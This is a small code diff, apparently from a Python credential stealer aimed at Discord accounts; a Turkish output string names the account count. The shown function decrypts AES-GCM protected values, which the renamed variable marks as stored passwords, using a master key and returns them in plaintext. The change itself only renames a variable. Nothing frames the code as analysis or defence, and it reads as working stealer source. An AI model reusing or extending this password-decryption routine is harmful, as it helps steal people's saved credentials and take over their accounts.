@@ -846,8 +846,8 @@ Discord Hesabin °{str(number_discord_account)}:
                 tag = buff[-16:]
                 cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv))
                 decryptor = cipher.decryptor()
-                decrypted = decryptor.update(payload) + decryptor.finalize_with_tag(tag)
-                return decrypted.decode()
+                decrypted_pass = decryptor.update(payload) + decryptor.finalize_with_tag(tag)
+                return decrypted_pass.decode()
             except:
                 return None
             
